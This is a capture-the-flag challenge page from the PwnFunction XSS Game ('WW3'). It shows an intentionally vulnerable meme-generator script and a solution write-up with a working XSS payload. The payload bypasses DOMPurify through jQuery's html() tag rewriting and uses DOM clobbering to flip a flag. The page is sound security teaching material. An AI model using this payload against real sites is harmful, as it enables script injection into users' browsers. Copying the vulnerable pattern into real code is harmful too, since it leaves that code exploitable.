---
title: "XSS Game - WW3 | PwnFunction"
header: "WW3"
challengeUrl: "https://sandbox.pwnfunction.com/challenges/ww3.html"
date: 2020-01-19T14:59:07+05:30
draft: false
type: challenge
difficulty: Hard
solvers: 3
---

<!-- Rules -->
{{< rules >}}
<li>Difficulty is <b>Hard</b>.</li>
<li>Pop an <code>alert(1337)</code> on <code>sandbox.pwnfunction.com</code>.</li>
<li>No user interaction.</li>
<li>Cannot use <code>https://sandbox.pwnfunction.com/?html=&js=&css=</code>.</li>
<li>Tested on <b>Chrome</b>.</li>
<li>Unintended solution? DM me <a target="_blank"
                            href="https://twitter.com/messages/compose?recipient_id=1084132461133451264"
                            class="function">@PwnFunction</a>.
                    </li>
{{</ rules >}}

<!-- Challenge Code -->
{{< code >}}<code class="language-markup">&#x3C;!-- Challenge --&#x3E;
&#x3C;div&#x3E;
    &#x3C;h4&#x3E;Meme Code&#x3C;/h4&#x3E;
    &#x3C;textarea class=&#x22;form-control&#x22; id=&#x22;meme-code&#x22; rows=&#x22;4&#x22;&#x3E;&#x3C;/textarea&#x3E;
    &#x3C;div id=&#x22;notify&#x22;&#x3E;&#x3C;/div&#x3E;
&#x3C;/div&#x3E;

&#x3C;script&#x3E;
    /* Utils */
    const escape = (dirty) =&#x3E; unescape(dirty).replace(/[&#x3C;&#x3E;&#x27;&#x22;=]/g, &#x27;&#x27;);
    const memeTemplate = (img, text) =&#x3E; {
        return (&#x60;&#x3C;style&#x3E;@import url(&#x27;https://fonts.googleapis.com/css?family=Oswald:700&#x26;display=swap&#x27;);&#x60;+
            &#x60;.meme-card{margin:0 auto;width:300px}.meme-card&#x3E;img{width:300px}&#x60;+
            &#x60;.meme-card&#x3E;h1{text-align:center;color:#fff;background:black;margin-top:-5px;&#x60;+
            &#x60;position:relative;font-family:Oswald,sans-serif;font-weight:700}&#x3C;/style&#x3E;&#x60;+
            &#x60;&#x3C;div class=&#x22;meme-card&#x22;&#x3E;&#x3C;img src=&#x22;${img}&#x22;&#x3E;&#x3C;h1&#x3E;${text}&#x3C;/h1&#x3E;&#x3C;/div&#x3E;&#x60;)
    }
    const memeGen = (that, notify) =&#x3E; {
        if (text &#x26;&#x26; img) {
            template = memeTemplate(img, text)

            if (notify) {
                html = (&#x60;&#x3C;div class=&#x22;alert alert-warning&#x22; role=&#x22;alert&#x22;&#x3E;&#x3C;b&#x3E;Meme&#x3C;/b&#x3E; created from ${DOMPurify.sanitize(text)}&#x3C;/div&#x3E;&#x60;)
            }

            setTimeout(_ =&#x3E; {
                $(&#x27;#status&#x27;).remove()
                notify ? ($(&#x27;#notify&#x27;).html(html)) : &#x27;&#x27;
                $(&#x27;#meme-code&#x27;).text(template)
            }, 1000)
        }
    }
&#x3C;/script&#x3E;

&#x3C;script&#x3E;
    /* Main */
    let notify = false;
    let text = new URL(location).searchParams.get(&#x27;text&#x27;)
    let img = new URL(location).searchParams.get(&#x27;img&#x27;)
    if (text &#x26;&#x26; img) {
        document.write(
            &#x60;&#x3C;div class=&#x22;alert alert-primary&#x22; role=&#x22;alert&#x22; id=&#x22;status&#x22;&#x3E;&#x60;+
            &#x60;&#x3C;img class=&#x22;circle&#x22; src=&#x22;${escape(img)}&#x22; onload=&#x22;memeGen(this, notify)&#x22;&#x3E;&#x60;+
            &#x60;Creating meme... (${DOMPurify.sanitize(text)})&#x3C;/div&#x3E;&#x60;
        )
    } else {
        $(&#x27;#meme-code&#x27;).text(memeTemplate(&#x27;https://i.imgur.com/PdbDexI.jpg&#x27;, &#x27;When you get that WW3 draft letter&#x27;))
    }
&#x3C;/script&#x3E;</code>{{< /code >}}

<!-- Solution Modal -->
{{< solution >}}
The solution to the "Hard" challenge is...
<pre class="solution-code-block"><code class="language-markup">&#x3C;img name=notify&#x3E;&#x3C;style&#x3E;&#x3C;style/&#x3E;&#x3C;script&#x3E;alert(1337)//</code></pre>
That's it, but there's quite a bit of stuff going on behind the scenes, lemme explain.
<br><br>
The sink here is Jquery’s <code>html()</code> function. Now you might usually ignore this as a sink because there’s DOMPurify sanitizing our input right? Well yes, but also no, not in the right context, because we’ve made a false assumption that sanitizing <code>innerHTML</code> is the same as sanitizing Jquery’s <code>html()</code>, which is not the case. Jquery does use <code>innerHTML</code> behind the scenes, but it does a little bit of fancy work before inserting it to the DOM.
<br><br>
Here's a rough call trace when the payload hits Jquery's <code>html()</code> Function.<br>
<code><a target="_blank" class="pwn" href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L372">html()</a></code>&nbsp;<i class="fas fa-arrow-right"></i>&nbsp;<code><a target="_blank" class="pwn" href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L406">append()</a></code>&nbsp;<i class="fas fa-arrow-right"></i>&nbsp;<code><a target="_blank" class="pwn" href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L312">domManip()</a></code>&nbsp;<i class="fas fa-arrow-right"></i>&nbsp;<code><a target="_blank" class="pwn" href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L117">buildFragment()</a></code>&nbsp;<i class="fas fa-arrow-right"></i>&nbsp;<code><a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation/buildFragment.js#L39" class="pwn" target="_blank">htmlPrefilter()</a></code>
<br>
Here, the interesting part is <code><a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L202" class="pwn" target="_blank">htmlPrefilter()</a></code>.
<pre><code class="language-js">// source of htmlPrefilter()
jQuery.extend( {
	htmlPrefilter: function( html ) {
		return html.replace( rxhtmlTag, "&#x3C;$1&#x3E;&#x3C;/$2&#x3E;" );
	},
    ...
</code></pre>
This essentially converts a self-closing tag into a full blown tag, for example,
<pre><code class="language-markup">&#x3C;blah/&#x3E;
&#x3C;!-- converted to --&#x3E;
&#x3C;blah&#x3E;&#x3C;/blah&#x3E;
</code></pre>
This can be really powerful.<br><br>
Consider <code>&#x3C;style&#x3E;&#x3C;style/&#x3E;Elon</code>, when <code>innerHTML</code> is used to insert this into the DOM, the resulting DOM Tree looks like this.
<pre><code class="language-markup">&#x3C;style&#x3E;
   &#x3C;style/&#x3E;Elon
&#x3C;/style&#x3E;</code></pre>
But with jquery’s <code>html()</code>, it’s a whole different story. When we try the same input with <code>html()</code>, we see the following.
<pre><code class="language-markup">&#x3C;style&#x3E;
   &#x3C;style&#x3E;
&#x3C;/style&#x3E;
Elon</code></pre>
The self-closing <code>&#x3C;style/&#x3E;</code> is replaced with <code>&#x3C;style&#x3E;&#x3C;/style&#x3E;</code>, which makes the second <code>&#x3C;style&#x3E;</code> tag to be treated as the contents of the first <code>&#x3C;style&#x3E;</code> tag, but look what happened to the <code>Elon</code> text, it’s outside the <code>&#x3C;style&#x3E;</code> tag and out open in the HTML context. Ergo, XSS.
<br><br>
But we still have one more problem, that’s the notification. The application uses Jquery’s <code>html()</code> only when the <code>notify</code> variable is <code>true</code>, but it’s clearly <code>false</code>, so how do we set it to <code>true</code>? <br>With the help of DOM clobbering and augmented scope chain, we can bypass this. DOM clobbering is basically creating html elements with id or sometimes name attributes can create javascript variables with that same name, I’ve explained it a bit more in the <a target="_blank" class="function" href="https://xss.pwnfunction.com/warmups/ok-boomer.html">Ok, Boomer challenge</a> or check out this <a target="_blank" class="function" href="https://youtu.be/2up8J9dErHI?t=797">YouTube Video</a>.<br>
But the problem is, we can’t overwrite the existing variables with this technique, because browsers don’t let you do that, that would be kinda crazy. So how are we supposed to change the <code>notify</code> value to <code>true</code> when we can’t overwrite the value? Well we can do some ninja shadow tricks.<br><br>

When an element has an event handler attribute on it like in our example, <code>onload</code> is the event. When the image loads, whatever the code is defined as the value, gets executed, basic stuff. But the code that runs when the event is fired, is actually wrapped inside a function that is then later called by the browser when the event is actually fired. Along with this, browsers augment the function’s scope chain with the element itself, <code>form</code>(if there's one) and also with the <code>document</code> object. Now if you have played around with DOM clobbering a bit, you’d know that you can clobber any property of the <code>document</code> object with HTML elements that can clobber using the <code>name</code> attribute, For example <code>&#x3C;img name=domain&#x3E;</code>, will clobber <code>document.domain</code>.
<br><br>
This means we can create a property named <code>notify</code> on the <code>document</code> object. Why would we need that? As we already know that there’s augmented scope on the <code>document</code> object on event handler code that’s wrapped in a function. Which means now the the javascript interpreter will check if <code>notify</code> is defined in the local scope, which is not the case, so it goes up the scope chain and checks in the <code>document</code> object, and here we do have a property named <code>notify</code>, so it’ll pull that value from <code>document</code> object instead of pulling it from the global scope. So we’ve essentially shadowed the original.<br><br>

Combining both the techniques, we can solve the challenge.
<pre class="solution-code-block"><code class="language-js">img=valid_image_url&text=&#x3C;img name=notify&#x3E;&#x3C;style&#x3E;&#x3C;style/&#x3E;&#x3C;script&#x3E;alert(1337)//</code></pre>

{{< /solution >}}

<!-- Solvers -->
{{< solvers >}}
<tr>
    <th scope="row">1</th>
    <td><a href="https://twitter.com/@terjanq" target="_blank" class="function">@terjanq</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">2</th>
    <td><a href="https://twitter.com/@lbherrera_" target="_blank"
            class="function">@lbherrera_</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">2</th>
    <td><a href="https://twitter.com/@deltaclock" target="_blank"
            class="function">@deltaclock</a>
    </td>
    <td>Intended</td>
</tr>
{{< /solvers >}}
